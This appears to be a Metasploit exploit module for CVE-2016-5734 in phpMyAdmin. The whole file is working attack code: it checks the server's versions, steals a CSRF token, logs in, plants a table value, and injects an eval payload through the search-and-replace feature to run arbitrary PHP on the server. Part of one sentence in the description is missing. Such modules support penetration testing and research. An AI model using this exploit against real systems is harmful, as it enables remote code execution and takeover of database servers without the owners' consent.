# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;phpMyAdmin Authenticated Remote Code Execution&#039;,
      &#039;Description&#039;     => %q{
        phpMyAdmin 4.0.x before 4.0.10.16, 4.4.x before 4.4.15.7, and 4.6.x before
        (aka eval) modifier, which might allow remote attackers to execute arbitrary
        PHP code via a crafted string, as demonstrated by the table search-and-replace
        implementation.
      },
      &#039;Author&#039; =>
        [
          &#039;Michal AihaA and Cure53&#039;, # Discovery
          &#039;Matteo Cantoni <goony[at]nothink.org>&#039; # Metasploit Module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ &#039;BID&#039;, &#039;91387&#039; ],
          [ &#039;CVE&#039;, &#039;2016-5734&#039; ],
          [ &#039;CWE&#039;, &#039;661&#039; ],
          [ &#039;URL&#039;, &#039;https://www.phpmyadmin.net/security/PMASA-2016-27/&#039; ],
          [ &#039;URL&#039;, &#039;https://security.gentoo.org/glsa/201701-32&#039; ],
          [ &#039;URL&#039;, &#039;https://www.exploit-db.com/exploits/40185/&#039; ],
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;  => [ &#039;php&#039; ],
      &#039;Arch&#039;  => ARCH_PHP,
      &#039;Payload&#039; =>
        {
          &#039;BadChars&#039; => "&\n=+%",
        },
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic&#039;, {} ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 23 2016&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base phpMyAdmin directory path", &#039;/phpmyadmin/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;root&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", &#039;&#039;]),
        OptString.new(&#039;DATABASE&#039;, [ true, "Existing database at a server", &#039;phpmyadmin&#039;])
      ])
  end

  def check
    begin
      res = send_request_cgi({ &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/js/messages.php&#039;) })
    rescue
      print_error("#{peer} - Unable to connect to server")
      return Exploit::CheckCode::Unknown
    end

    if res.nil? || res.code != 200
      print_error("#{peer} - Unable to query /js/messages.php")
      return Exploit::CheckCode::Unknown
    end

    # PHP 4.3.0-5.4.6
    # PHP > 5.4.6 not exploitable because null byte in regexp warning
    php_version = res[&#039;X-Powered-By&#039;]
    if php_version
      vprint_status("#{peer} - PHP version: #{php_version}")

      if php_version =~ /PHP\/(\d+\.\d+\.\d+)/
        version = Gem::Version.new($1)
        vprint_status("#{peer} - PHP version: #{version.to_s}")
        if version > Gem::Version.new(&#039;5.4.6&#039;)
          return Exploit::CheckCode::Safe
        end
      end
    else
      vprint_status("#{peer} - Unknown PHP version")
    end

    # 4.3.0 - 4.6.2 authorized user RCE exploit
    if res.body =~ /pmaversion = &#039;(\d+\.\d+\.\d+)&#039;;/
      version = Gem::Version.new($1)
      vprint_status("#{peer} - phpMyAdmin version: #{version.to_s}")

      if version >= Gem::Version.new(&#039;4.3.0&#039;) and version <= Gem::Version.new(&#039;4.6.2&#039;)
        return Exploit::CheckCode::Appears
      elsif version < Gem::Version.new(&#039;4.3.0&#039;)
        return Exploit::CheckCode::Detected
      end
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    return unless check == Exploit::CheckCode::Appears

    uri = target_uri.path
    vprint_status("#{peer} - Grabbing CSRF token...")

    response = send_request_cgi({ &#039;uri&#039; => uri})

    if response.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage grabbing CSRF token")
    elsif (response.body !~ /"token"\s*value="([^"]*)"/)
      fail_with(Failure::NotFound, "#{peer} - Couldn&#039;t find token. Is URI set correctly?")
    end

    token = $1
    vprint_status("#{peer} - Retrieved token #{token}")

    vprint_status("#{peer} - Authenticating...")
    login = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_post&#039; => {
        &#039;token&#039; => token,
        &#039;pma_username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;pma_password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })

    if login.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage")
    elsif login.redirect?
      token = login.redirection.to_s.scan(/token=(.*)[&|$]/).flatten.first
    else
      fail_with(Failure::NotFound, "#{peer} - Couldn&#039;t find token. Wrong phpMyAdmin version?")
    end

    cookies = login.get_cookies

    login_check = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039; => { &#039;token&#039; => token },
      &#039;cookie&#039; => cookies
    })

    if login_check.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage")
    elsif login_check.body =~ /Welcome to/
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    end

    vprint_status("#{peer} - Authentication successful")

    # Create random table and column
    rand_table = Rex::Text.rand_text_alpha_lower(3+rand(3))
    rand_column = Rex::Text.rand_text_alpha_lower(3+rand(3))
    sql_value = &#039;0%2Fe%00&#039;

    vprint_status("#{peer} - Create random table &#039;#{rand_table}&#039; into &#039;#{datastore[&#039;DATABASE&#039;]}&#039; database...");

    create_rand_table = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;import.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039; => {
        &#039;show_query&#039; => &#039;0&#039;,
        &#039;ajax_request&#039; => &#039;true&#039;,
        &#039;db&#039; => datastore[&#039;DATABASE&#039;],
        &#039;pos&#039; => &#039;0&#039;,
        &#039;is_js_confirmed&#039; => &#039;0&#039;,
        &#039;fk_checks&#039; => &#039;0&#039;,
        &#039;sql_delimiter&#039; => &#039;;&#039;,
        &#039;token&#039; => token,
        &#039;SQL&#039; => &#039;Go&#039;,
        &#039;ajax_page_request&#039; => &#039;true&#039;,
        &#039;sql_query&#039; => "CREATE+TABLE+`#{rand_table}`+( ++++++`#{rand_column}`+varchar(10)+CHARACTER+SET"\
                    "+utf8+NOT+NULL ++++)+ENGINE=InnoDB+DEFAULT+CHARSET=latin1; ++++INSERT+INTO+`#{rand_table}`+"\
                    "(`#{rand_column}`)+VALUES+(&#039;#{sql_value}&#039;); ++++",
      }
    })

    if create_rand_table.nil? || create_rand_table.body =~ /(.*)<code>\\n(.*)\\n<\\\/code>(.*)/i
      fail_with(Failure::Unknown, "#{peer} - Failed to create a random table")
    end

    vprint_status("#{peer} - Random table created")

    # Execute command
    command = Rex::Text.uri_encode(payload.encoded)

    exec_cmd = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;tbl_find_replace.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039; =>{
        &#039;columnIndex&#039; => &#039;0&#039;,
        &#039;token&#039; => token,
        &#039;submit&#039; => &#039;Go&#039;,
        &#039;ajax_request&#039; => &#039;true&#039;,
        &#039;goto&#039; => &#039;sql.php&#039;,
        &#039;table&#039; => rand_table,
        &#039;replaceWith&#039; => "eval%28%22#{command}%22%29%3B",
        &#039;db&#039; => datastore[&#039;DATABASE&#039;],
        &#039;find&#039; => sql_value,
        &#039;useRegex&#039; => &#039;on&#039;
      }
    })

    # Remove random table
    vprint_status("#{peer} - Remove the random table &#039;#{rand_table}&#039; from &#039;#{datastore[&#039;DATABASE&#039;]}&#039; database")

    rm_table = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;import.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
      &#039;encode_params&#039; => false,
      &#039;vars_post&#039; => {
        &#039;show_query&#039; => &#039;0&#039;,
        &#039;ajax_request&#039; => &#039;true&#039;,
        &#039;db&#039; => datastore[&#039;DATABASE&#039;],
        &#039;pos&#039; => &#039;0&#039;,
        &#039;is_js_confirmed&#039; => &#039;0&#039;,
        &#039;fk_checks&#039; => &#039;0&#039;,
        &#039;sql_delimiter&#039; => &#039;;&#039;,
        &#039;token&#039; => token,
        &#039;SQL&#039; => &#039;Go&#039;,
        &#039;ajax_page_request&#039; => &#039;true&#039;,
        &#039;sql_query&#039; => "DROP+TABLE+`#{rand_table}`"
      }
    })

    if rm_table.nil? || rm_table.body !~ /(.*)MySQL returned an empty result set \(i.e. zero rows\).(.*)/i
      print_bad("#{peer} - Failed to remove the table &#039;#{rand_table}&#039;")
    end
  end
end

